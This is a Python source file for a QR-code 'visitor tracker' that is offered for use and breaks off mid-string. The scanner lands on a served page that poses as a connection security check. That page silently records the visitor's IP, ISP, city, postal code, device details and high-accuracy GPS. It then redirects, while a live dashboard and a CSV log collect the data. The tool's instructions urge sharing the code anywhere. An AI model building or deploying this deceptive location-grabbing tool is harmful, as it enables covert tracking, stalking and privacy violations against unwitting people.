"""
QR Code Tracking System with ngrok - Generate QR code, when scanned, get visitor's location, ISP, device info
"""

import os
import json
import csv
import threading
import webbrowser
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import qrcode
from PIL import Image, ImageTk
import io
import requests
from pyngrok import ngrok, conf

CSV_FILE = "tracking_data.csv"

# HTML page that captures visitor data when QR code is scanned
TRACKING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Visitor Tracking</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 90%;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info {
            font-size: 12px;
            margin-top: 20px;
            opacity: 0.8;
        }
        .success {
            color: #4CAF50;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Processing...</h2>
        <div class="spinner"></div>
        <p>Please wait while we verify your connection...</p>
        <div class="info">This helps us improve security</div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const redirectUrl = urlParams.get('redirect') || 'https://www.google.com';
        
        async function collectData() {
            const data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenSize: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || "Direct",
                url: window.location.href
            };
            
            // Get IP and location data
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
                data.city = ipData.city;
                data.region = ipData.region;
                data.country = ipData.country_name;
                data.country_code = ipData.country_code;
                data.postal = ipData.postal;
                data.latitude = ipData.latitude;
                data.longitude = ipData.longitude;
                data.isp = ipData.org;
                data.timezone_ip = ipData.timezone;
            } catch(e) {
                data.ip = "Unable to fetch";
                console.error("IP fetch error:", e);
            }
            
            // Try to get GPS location
            if ('geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 5000,
                            enableHighAccuracy: true
                        });
                    });
                    data.gps_latitude = position.coords.latitude;
                    data.gps_longitude = position.coords.longitude;
                    data.gps_accuracy = position.coords.accuracy;
                } catch(e) {
                    data.gps_error = e.message;
                }
            }
            
            // Send data to server
            const response = await fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            const result = await response.json();
            
            if (result.success) {
                document.body.innerHTML = `
                    <div class="container">
                        <h2 class="success">✅ Access Granted</h2>
                        <p>Thank you for your visit!</p>
                        <p style="font-size: 12px; margin-top: 20px;">Redirecting...</p>
                    </div>
                `;
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 3000);
            }
        }
        
        collectData();
    </script>
</body>
</html>
"""

# Dashboard HTML
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Live Visitor Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
        }
        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: #667eea;
        }
        .stat-label {
            color: #666;
            margin-top: 5px;
        }
        .filters {
            background: white;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .filter-group {
            display: inline-block;
            margin-right: 15px;
        }
        select, input {
            padding: 5px 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 5px 15px;
            border-radius: 5px;
            cursor: pointer;
        }
        table {
            width: 100%;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        th {
            background: #667eea;
            color: white;
            padding: 12px;
            text-align: left;
            cursor: pointer;
        }
        td {
            padding: 10px;
            border-bottom: 1px solid #eee;
        }
        tr:hover {
            background: #f5f5f5;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 5px;
            font-size: 11px;
            font-weight: bold;
        }
        .badge-mobile {
            background: #d4edda;
            color: #155724;
        }
        .badge-desktop {
            background: #d1ecf1;
            color: #0c5460;
        }
        .live-badge {
            background: #28a745;
            color: white;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 11px;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #4CAF50;
            color: white;
            padding: 15px;
            border-radius: 5px;
            animation: slideIn 0.5s ease-out;
            z-index: 1000;
        }
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 LIVE VISITOR TRACKING DASHBOARD</h1>
            <p>Real-time visitor tracking - <span class="live-badge">🔴 LIVE</span></p>
            <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
            <button class="export-btn" onclick="exportData()">💾 Export CSV</button>
            <button class="clear-btn" onclick="clearAll()">🗑 Clear All</button>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="totalVisits">0</div>
                <div class="stat-label">Total Visits</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uniqueIPs">0</div>
                <div class="stat-label">Unique IPs</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uniqueCountries">0</div>
                <div class="stat-label">Countries</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="mobileUsers">0</div>
                <div class="stat-label">Mobile Users</div>
            </div>
        </div>
        
        <div class="filters">
            <div class="filter-group">
                <label>Country:</label>
                <select id="countryFilter" onchange="filterData()">
                    <option value="">All</option>
                </select>
            </div>
            <div class="filter-group">
                <label>Device:</label>
                <select id="deviceFilter" onchange="filterData()">
                    <option value="">All</option>
                    <option value="mobile">Mobile</option>
                    <option value="desktop">Desktop</option>
                </select>
            </div>
            <div class="filter-group">
                <label>Search:</label>
                <input type="text" id="searchInput" placeholder="IP, ISP, or City..." onkeyup="filterData()">
            </div>
        </div>
        
        <div style="overflow-x: auto;">
            <table id="dataTable">
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>IP Address</th>
                        <th>Location</th>
                        <th>Country</th>
                        <th>ISP</th>
                        <th>Device</th>
                        <th>Map</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                </tbody>
            </table>
        </div>
    </div>

    <script>
        let allData = [];
        
        async function loadData() {
            const response = await fetch('/api/tracking-data');
            allData = await response.json();
            updateStats();
            populateFilters();
            displayData(allData);
        }
        
        function updateStats() {
            const uniqueIPs = new Set(allData.map(d => d.ip)).size;
            const uniqueCountries = new Set(allData.map(d => d.country)).size;
            const mobileUsers = allData.filter(d => d.userAgent && d.userAgent.includes('Mobile')).length;
            
            document.getElementById('totalVisits').innerHTML = allData.length;
            document.getElementById('uniqueIPs').innerHTML = uniqueIPs;
            document.getElementById('uniqueCountries').innerHTML = uniqueCountries;
            document.getElementById('mobileUsers').innerHTML = mobileUsers;
        }
        
        function populateFilters() {
            const countries = [...new Set(allData.map(d => d.country).filter(c => c))];
            const countrySelect = document.getElementById('countryFilter');
            countries.forEach(country => {
                const option = document.createElement('option');
                option.value = country;
                option.text = country;
                countrySelect.appendChild(option);
            });
        }
        
        function filterData() {
            const country = document.getElementById('countryFilter').value;
            const device = document.getElementById('deviceFilter').value;
            const search = document.getElementById('searchInput').value.toLowerCase();
            
            let filtered = allData;
            
            if (country) {
                filtered = filtered.filter(d => d.country === country);
            }
            if (device === 'mobile') {
                filtered = filtered.filter(d => d.userAgent && d.userAgent.includes('Mobile'));
            } else if (device === 'desktop') {
                filtered = filtered.filter(d => d.userAgent && !d.userAgent.includes('Mobile'));
            }
            if (search) {
                filtered = filtered.filter(d => 
                    (d.ip && d.ip.toLowerCase().includes(search)) ||
                    (d.isp && d.isp.toLowerCase().includes(search)) ||
                    (d.city && d.city.toLowerCase().includes(search))
                );
            }
            
            displayData(filtered);
        }
        
        function displayData(data) {
            const tbody = document.getElementById('tableBody');
            tbody.innerHTML = '';
            
            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="7" style="text-align: center;">No data found</td></tr>';
                return;
            }
            
            data.forEach(item => {
                const row = tbody.insertRow();
                const isMobile = item.userAgent && item.userAgent.includes('Mobile');
                const deviceType = isMobile ? '<span class="badge badge-mobile">📱 Mobile</span>' : '<span class="badge badge-desktop">💻 Desktop</span>';
                const time = new Date(item.timestamp).toLocaleString();
                
                row.innerHTML = `
                    <td>${time}</td>
                    <td><strong>${item.ip || 'N/A'}</strong></td>
                    <td>${item.city || 'N/A'}, ${item.region || ''}</td>
                    <td>${item.country || 'N/A'}</td>
                    <td><small>${item.isp || 'N/A'}</small></td>
                    <td>${deviceType}</td>
                    <td>
                        ${item.latitude && item.longitude ? 
                            `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank">📍 View</a>` : 
                            item.gps_latitude ? 
                            `<a href="https://www.google.com/maps?q=${item.gps_latitude},${item.gps_longitude}" target="_blank">📍 GPS</a>` : 
                            '—'
                        }
                    </td>
                `;
            });
        }
        
        function exportData() {
            window.location.href = '/export-csv';
        }
        
        function clearAll() {
            if (confirm('⚠️ WARNING: This will delete ALL tracking data! Are you sure?')) {
                fetch('/clear-data', { method: 'POST' })
                    .then(() => location.reload());
            }
        }
        
        loadData();
        setInterval(loadData, 3000);
        
        // Check for new visitors and show notification
        let lastCount = 0;
        setInterval(async () => {
            const response = await fetch('/api/tracking-data');
            const newData = await response.json();
            if (newData.length > lastCount) {
                showNotification(`New visitor! Total: ${newData.length}`);
                lastCount = newData.length;
            }
        }, 5000);
        
        function showNotification(message) {
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.innerHTML = '🔔 ' + message;
            document.body.appendChild(notification);
            setTimeout(() => notification.remove(), 3000);
        }
    </script>
</body>
</html>
"""

class TrackingHandler(BaseHTTPRequestHandler):
    """HTTP handler for tracking system"""
    
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        
        if path == '/' or path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(TRACKING_PAGE.encode('utf-8'))
        
        elif path == '/dashboard':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(DASHBOARD_HTML.encode('utf-8'))
        
        elif path == '/api/tracking-data':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            data = []
            if os.path.exists(CSV_FILE):
                with open(CSV_FILE, 'r', encoding='utf-8') as f:
                    reader = csv.DictReader(f)
                    data = list(reader)
            
            self.wfile.write(json.dumps(data).encode('utf-8'))
        
        elif path == '/export-csv':
            if os.path.exists(CSV_FILE):
                self.send_response(200)
                self.send_header('Content-type', 'text/csv')
                self.send_header('Content-Disposition', f'attachment; filename=tracking_data_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv')
                self.end_headers()
                with open(CSV_FILE, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
        
        else:
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/track':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Save tracking data
            file_exists = os.path.exists(CSV_FILE)
            with open(CSV_FILE, 'a', newline='', encoding='utf-8') as f:
                fieldnames = ['timestamp', 'ip', 'city', 'region', 'country', 'country_code', 
                              'postal', 'latitude', 'longitude', 'isp', 'timezone_ip', 'gps_latitude', 
                              'gps_longitude', 'gps_accuracy', 'userAgent', 'platform', 'language', 
                              'screenSize', 'timezone', 'referrer', 'url']
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                if not file_exists:
                    writer.writeheader()
                
                row = {field: data.get(field, 'N/A') for field in fieldnames}
                writer.writerow(row)
            
            # Print to console with formatting
            print(f"\n{'='*70}")
            print(f"🔔 NEW VISITOR DETECTED!")
            print(f"{'='*70}")
            print(f"⏰ Time: {data.get('timestamp', 'N/A')}")
            print(f"🌐 IP Address: {data.get('ip', 'N/A')}")
            print(f"📍 Location: {data.get('city', 'N/A')}, {data.get('region', 'N/A')}, {data.get('country', 'N/A')}")
            print(f"🏢 ISP: {data.get('isp', 'N/A')}")
            print(f"📱 Device: {'Mobile' if 'Mobile' in data.get('userAgent', '') else 'Desktop'}")
            print(f"🖥️ Browser: {data.get('userAgent', 'N/A')[:50]}...")
            print(f"🌍 Coordinates: {data.get('latitude', 'N/A')}, {data.get('longitude', 'N/A')}")
            if data.get('gps_latitude'):
                print(f"📍 GPS Location: {data.get('gps_latitude')}, {data.get('gps_longitude')}")
            print(f"{'='*70}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True}).encode('utf-8'))
        
        elif self.path == '/clear-data':
            if os.path.exists(CSV_FILE):
                os.remove(CSV_FILE)
                with open(CSV_FILE, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['timestamp', 'ip', 'city', 'region', 'country', 'country_code', 
                                    'postal', 'latitude', 'longitude', 'isp', 'timezone_ip', 'gps_latitude', 
                                    'gps_longitude', 'gps_accuracy', 'userAgent', 'platform', 'language', 
                                    'screenSize', 'timezone', 'referrer', 'url'])
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True}).encode('utf-8'))
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

class QRCodeTrackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("QR Code Tracker with ngrok - Global Visitor Tracking")
        self.root.geometry("1300x800")
        self.root.configure(bg='#1e1e2e')
        
        self.ngrok_url = None
        self.setup_ui()
        
        # Ask for ngrok auth token first
        self.ask_for_auth_token()
    
    def ask_for_auth_token(self):
        # Welcome dialog
        welcome = tk.Toplevel(self.root)
        welcome.title("Welcome - ngrok Setup Required")
        welcome.geometry("600x500")
        welcome.configure(bg='#2c3e50')
        welcome.transient(self.root)
        welcome.grab_set()
        
        # Center the window
        welcome.update_idletasks()
        x = (welcome.winfo_screenwidth() // 2) - (600 // 2)
        y = (welcome.winfo_screenheight() // 2) - (500 // 2)
        welcome.geometry(f"600x500+{x}+{y}")
        
        # Instructions
        tk.Label(welcome, text="🔐 ngrok Authentication Required", 
                font=('Arial', 18, 'bold'), bg='#2c3e50', fg='white').pack(pady=20)
        
        tk.Label(welcome, text="To make your tracking server accessible from anywhere (internet),", 
                font=('Arial', 10), bg='#2c3e50', fg='#ecf0f1').pack()
        tk.Label(welcome, text="you need an ngrok auth token.", 
                font=('Arial', 10), bg='#2c3e50', fg='#ecf0f1').pack()
        
        # How to get token
        info_frame = tk.Frame(welcome, bg='#34495e', relief=tk.RIDGE, bd=2)
        info_frame.pack(pady=20, padx=20, fill='both', expand=True)
        
        tk.Label(info_frame, text="📝 How to get your ngrok auth token:", 
                font=('Arial', 12, 'bold'), bg='#34495e', fg='#3498db').pack(pady=10, padx=10, anchor='w')
        
        steps = [
            "1. Go to https://dashboard.ngrok.com/signup",
            "2. Create a free account (or login)",
            "3. Go to 'Your Authtoken' section",
            "4. Copy your authtoken (looks like: 2abc3def456...)",
            "5. Paste it below"
        ]
        
        for step in steps:
            tk.Label(info_frame, text=step, font=('Courier', 10), 
                    bg='#34495e', fg='white', justify='left').pack(pady=5, padx=10, anchor='w')
        
        # Token input
        tk.Label(welcome, text="Enter your ngrok Auth Token:", 
                font=('Arial', 11), bg='#2c3e50', fg='white').pack(pady=10)
        
        self.token_entry = tk.Entry(welcome, font=('Courier', 12), width=50, show='*')
        self.token_entry.pack(pady=5, padx=20)
        
        # Show/hide token checkbox
        show_var = tk.BooleanVar()
        def toggle_show():
            self.token_entry.config(show='' if show_var.get() else '*')
        
        tk.Checkbutton(welcome, text="Show token", variable=show_var, command=toggle_show,
                      bg='#2c3e50', fg='white', selectcolor='#2c3e50').pack()
        
        # Buttons
        btn_frame = tk.Frame(welcome, bg='#2c3e50')
        btn_frame.pack(pady=20)
        
        def save_and_continue():
            auth_token = self.token_entry.get().strip()
            if not auth_token:
                messagebox.showerror("Error", "Please enter your ngrok auth token!")
                return
            
            try:
                # Configure ngrok with auth token
                conf.get_default().auth_token = auth_token
                print("\n✅ ngrok auth token configured successfully!")
                welcome.destroy()
                self.start_ngrok_and_server()
            except Exception as e:
                messagebox.showerror("Error", f"Failed to configure ngrok: {str(e)}")
        
        tk.Button(btn_frame, text="✅ Continue with ngrok", command=save_and_continue,
                 bg='#27ae60', fg='white', font=('Arial', 12, 'bold'),
                 padx=20, pady=10, cursor='hand2').pack()
        
        # Skip button for local only
        def skip_ngrok():
            if messagebox.askyesno("Skip ngrok", 
                                  "Without ngrok, QR codes will only work on your local network.\n\n"
                                  "Continue with local network only?"):
                welcome.destroy()
                self.start_server_only()
        
        tk.Button(btn_frame, text="⚠️ Skip - Local Network Only", command=skip_ngrok,
                 bg='#e74c3c', fg='white', font=('Arial', 10),
                 padx=15, pady=5, cursor='hand2').pack(pady=5)
    
    def setup_ui(self):
        # Title
        title_frame = tk.Frame(self.root, bg='#667eea', height=80)
        title_frame.pack(fill='x')
        title_frame.pack_propagate(False)
        
        title = tk.Label(title_frame, text="🌍 QR Code Visitor Tracker (Global via ngrok)", 
                        font=('Arial', 20, 'bold'), bg='#667eea', fg='white')
        title.pack(expand=True)
        
        # Status bar
        self.status_frame = tk.Frame(self.root, bg='#2c3e50', height=40)
        self.status_frame.pack(fill='x', side='bottom')
        self.status_frame.pack_propagate(False)
        
        self.status_label = tk.Label(self.status_frame, text="⏳ Initializing...", 
                                     font=('Arial', 10), bg='#2c3e50', fg='white')
        self.status_label.pack(side='left', padx=10, pady=10)
        
        # Main content with tabs
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Tab 1: Generate QR Code
        self.generate_frame = tk.Frame(notebook, bg='white')
        notebook.add(self.generate_frame, text="🔨 Generate QR Code")
        self.setup_generate_tab()
        
        # Tab 2: Live Statistics
        self.stats_frame = tk.Frame(notebook, bg='white')
        notebook.add(self.stats_frame, text="📊 Live Statistics")
        self.setup_stats_tab()
        
        # Tab 3: Web Dashboard
        web_frame = tk.Frame(notebook, bg='white')
        notebook.add(web_frame, text="🌐 Web Dashboard")
        self.setup_web_tab(web_frame)
    
    def setup_generate_tab(self):
        # Campaign name
        tk.Label(self.generate_frame, text="Campaign Name (Optional):", 
                font=('Arial', 12), bg='white').pack(pady=10)
        self.campaign_entry = tk.Entry(self.generate_frame, font=('Arial', 12), width=40)
        self.campaign_entry.pack(pady=5)
        self.campaign_entry.insert(0, "my_campaign")
        
        # Redirect URL
        tk.Label(self.generate_frame, text="Redirect URL After Scan (Optional):", 
                font=('Arial', 12), bg='white').pack(pady=10)
        self.redirect_entry = tk.Entry(self.generate_frame, font=('Arial', 12), width=50)
        self.redirect_entry.pack(pady=5)
        self.redirect_entry.insert(0, "https://www.google.com")
        
        # Generate button
        generate_btn = tk.Button(self.generate_frame, text="✨ Generate Tracking QR Code", 
                                command=self.generate_qr_code,
                                bg='#667eea', fg='white', font=('Arial', 14, 'bold'),
                                padx=30, pady=15, cursor='hand2')
        generate_btn.pack(pady=20)
        
        # QR Code display
        self.qr_label = tk.Label(self.generate_frame, bg='white', relief=tk.SUNKEN, bd=2)
        self.qr_label.pack(pady=10, padx=20)
        
        # Info text
        info_text = """
        📌 HOW THIS WORKS:
        
        1. Enter your ngrok auth token on startup
        2. Click "Generate Tracking QR Code" above
        3. Save the QR code image
        4. Share it ANYWHERE (WhatsApp, email, social media, posters)
        5. When someone scans it from ANYWHERE in the world:
           • Their location (city, country) is captured
           • Their IP address and ISP are recorded
           • Their device type (mobile/desktop) is detected
           • GPS coordinates (if they allow)
           • Date and time of scan
        6. Watch visitor data appear LIVE on your screen!
        
        🔗 The QR code contains a public ngrok URL that works from anywhere on the internet!
        
        ⚠️ PRIVACY NOTE: Use this tool responsibly and in compliance with privacy laws.
        """
        
        info_label = tk.Label(self.generate_frame, text=info_text, 
                              font=('Courier', 9), bg='#f8f9fa', 
                              justify=tk.LEFT, padx=20, pady=20)
        info_label.pack(pady=20, fill='both', expand=True)
    
    def setup_stats_tab(self):
        self.stats_text = scrolledtext.ScrolledText(self.stats_frame, font=('Courier', 10),
                                                     bg='#1e1e2e', fg='#00ff00',
                                                     wrap=tk.WORD)
        self.stats_text.pack(fill='both', expand=True, padx=10, pady=10)
        
        btn_frame = tk.Frame(self.stats_frame, bg='white')
        btn_frame.pack(pady=10)
        
        refresh_btn = tk.Button(btn_frame, text="🔄 Refresh Statistics", 
                               command=self.refresh_stats,
                               bg='#28a745', fg='white', font=('Arial', 10, 'bold'),
                               padx=15, pady=5, cursor='hand2')
        refresh_btn.pack(side=tk.LEFT, padx=5)
        
        clear_btn = tk.Button(btn_frame, text="🗑 Clear All Data", 
                             command=self.clear_all_data,
                             bg='#dc3545', fg='white', font=('Arial', 10, 'bold'),
                             padx=15, pady=5, cursor='hand2')
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        self.refresh_stats()
        self.auto_refresh()
    
    def auto_refresh(self):
        self.refresh_stats()
        self.root.after(5000, self.auto_refresh)
    
    def setup_web_tab(self, parent):
        self.web_info_text = scrolledtext.ScrolledText(parent, font=('Courier', 11), 
                                                        bg='#f8f9fa', wrap=tk.WORD)
        self.web_info_text.pack(fill='both', expand=True, padx=20, pady=20)
        
        btn_frame = tk.Frame(parent, bg='white')
        btn_frame.pack(pady=20)
        
        def open_tracking():
            if self.ngrok_url:
                webbrowser.open(f'{self.ngrok_url}/')
            else:
                webbrowser.open('http://localhost:5000/')
        
        def open_dashboard():
            if self.ngrok_url:
                webbrowser.open(f'{self.ngrok_url}/dashboard')
            else:
                webbrowser.open('http://localhost:5000/dashboard')
        
        tracking_btn = tk.Button(btn_frame, text="Open Tracking Page", 
                                command=open_tracking,
                                bg='#667eea', fg='white', font=('Arial', 11, 'bold'),
                                padx=20, pady=8, cursor='hand2')
        tracking_btn.pack(side=tk.LEFT, padx=10)
        
        dashboard_btn = tk.Button(btn_frame, text="Open Dashboard", 
                                 command=open_dashboard,
                                 bg='#764ba2', fg='white', font=('Arial', 11, 'bold'),
                                 padx=20, pady=8, cursor='hand2')
        dashboard_btn.pack(side=tk.LEFT, padx=10)
    
    def start_server_only(self):
        """Start only local server without ngrok"""
        def run_server():
            server_address = ('', 5000)
            httpd = HTTPServer(server_address, TrackingHandler)
            print(f"\n✅ Local server started on port 5000")
            httpd.serve_forever()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        
        self.update_status("✅ Server running on http://localhost:5000 (Local network only)")
        
        info = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                    LOCAL SERVER STARTED                               ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║  📍 Tracking Page:  http://localhost:5000                            ║
║  📊 Dashboard:      http://localhost:5000/dashboard                  ║
║                                                                       ║
║  ⚠️ QR codes will only work on your LOCAL NETWORK!                   ║
║  ⚠️ For global access, restart and enter ngrok auth token            ║
║                                                                       ║
╚══════════════════════════════════════════════════════════════════════╝
        """
        
        self.web_info_text.delete(1.0, tk.END)
        self.web_info_text.insert(1.0, info)
    
    def start_ngrok_and_server(self):
        """Start ngrok tunnel and local server"""
        try:
            self.update_status("🚀 Starting ngrok tunnel...")
            
            # Kill any existing ngrok processes
            ngrok.kill()
            
            # Start ngrok tunnel on port 5000
            ngrok_tunnel = ngrok.connect(5000, "http")
            self.ngrok_url = ngrok_tunnel.public_url
            
            # Start local server
            def run_server():
                server_address = ('', 5000)
                httpd = HTTPServer(server_address, TrackingHandler)
                print(f"\n✅ Local server started on port 5000")
                httpd.serve_forever()
            
            server_thread = threading.Thread(target=run_server, daemon=True)
            server_thread.start()
            
            self.update_status(f"✅ ngrok tunnel active! Public URL: {self.ngrok_url}")
            
            # Display info
            info = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                    🎉 NGROK TUNNEL ACTIVE! 🎉                         ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║  🌍 YOUR PUBLIC URL (Share this!):                                   ║
║  📍 {self.ngrok_url}                                                 ║
║                                                                       ║
║  📊 Live Dashboard:  {self.ngrok_url}/dashboard                      ║
║  📱 Tracking Page:   {self.ngrok_url}/                               ║
║                                                                       ║
║  🎯 HOW TO USE:                                                      ║
║  1. Generate QR code using the URL above                            ║
║  2. Share QR code ANYWHERE in the world                             ║
║  3. When scanned, visitor data appears LIVE on your screen!         ║
║                                                                       ║
║  📱 Access from any device:                                          ║
║     {self.ngrok_url}                                                 ║
║                                                                       ║
║  ⚡ Visitors will be tracked in REAL-TIME!                           ║
║                                                                       ║
╚══════════════════════════════════════════════════════════════════════╝
            """
            
            self.web_info_text.delete(1.0, tk.END)
            self.web_info_text.insert(1.0, info)
            
            print(f"\n{'='*70}")
            print(f"🎉 NGROK TUNNEL ACTIVE!")
            print(f"{'='*70}")
            print(f"🌍 Public URL: {self.ngrok_url}")
            print(f"📊 Dashboard: {self.ngrok_url}/dashboard")
            print(f"{'='*70}\n")
            
            # Open dashboard automatically
            webbrowser.open(f'{self.ngrok_url}/dashboard')
            
        except Exception as e:
            self.update_status(f"❌ ngrok error: {str(e)}")
            messagebox.showerror("ngrok Error", 
                               f"Failed to start ngrok: {str(e)}\n\n"
                               "Make sure you:\n"
                               "1. Have an internet connection\n"
                               "2. Entered a valid auth token\n"
                               "3. Installed pyngrok: pip install pyngrok")
    
    def update_status(self, message):
        self.status_label.config(text=message)
        self.root.update_idletasks()
    
    def generate_qr_code(self):
        if not self.ngrok_url:
            # Check if user wants to use local URL or start ngrok
            choice = messagebox.askyesno("QR Code Generation",
                                        "You're running in local-only mode.\n\n"
                                        "QR codes will only work on your local network.\n\n"
                                        "Do you want to generate a local QR code?")
            if not choice:
                return
            base_url = "http://localhost:5000"
        else:
            base_url = self.ngrok_url
        
        campaign = self.campaign_entry.get().strip()
        redirect = self.redirect_entry.get().strip()
        
        if not campaign:
            campaign = "default"
        
        if not redirect:
            redirect = "https://www.google.com"
        
        # Create tracking URL
        tracking_url = f"{base_url}/?campaign={campaign}&redirect={redirect}"
        
        # Generate QR code
        qr = qrcode.QRCode(version=1, box_size=10, border=4)
        qr.add_data(tracking_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Save to file
        filename = f"tracking_qr_{campaign}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        img.save(filename)
        
        # Display in GUI
        img_resized = img.resize((250, 250), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(img_resized)
        self.qr_label.config(image=photo)
        self.qr_label.image = photo
        
        # Show success message
        messagebox.showinfo("QR Code Generated!", 
                           f"✅ QR Code saved as: {filename}\n\n"
                           f"📱 Tracking URL: {tracking_url}\n\n"
                           f"When someone scans this QR code:\n"
                           f"• Their location will be captured\n"
                           f"• Their IP and ISP will be recorded\n"
                           f"• Their device info will be saved\n"
                           f"• They will be redirected to: {redirect}\n\n"
                           f"📊 View data LIVE in the dashboard and console!")
        
        print(f"\n✅ QR Code Generated: {filename}")
        print(f"   Tracking URL: {tracking_url}")
        print(f"   Share this QR code to start collecting visitor data from ANYWHERE!\n")
    
    def refresh_stats(self):
        self.stats_text.delete(1.0, tk.END)
        
        if not os.path.exists(CSV_FILE):
            self.stats_text.insert(tk.END, "No visitors yet.\n\nGenerate a QR code and share it - when someone scans it, their data will appear here in REAL-TIME!")
            return
        
        with open(CSV_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            data = list(reader)
        
        if not data:
            self.stats_text.insert(tk.END, "No visitors yet.\n\nGenerate a QR code and share it - when someone scans it, their data will appear here in REAL-TIME!")
            return
        
        unique_ips = set()
        countries = set()
        mobile = 0
        
        for row in data:
            if row.get('ip'):
                unique_ips.add(row['ip'])
            if row.get('country'):
                countries.add(row['country'])
            if row.get('userAgent') and 'Mobile' in row['userAgent']:
                mobile += 1
        
        stats = f"""
╔══════════════════════════════════════════════════════════════════════╗
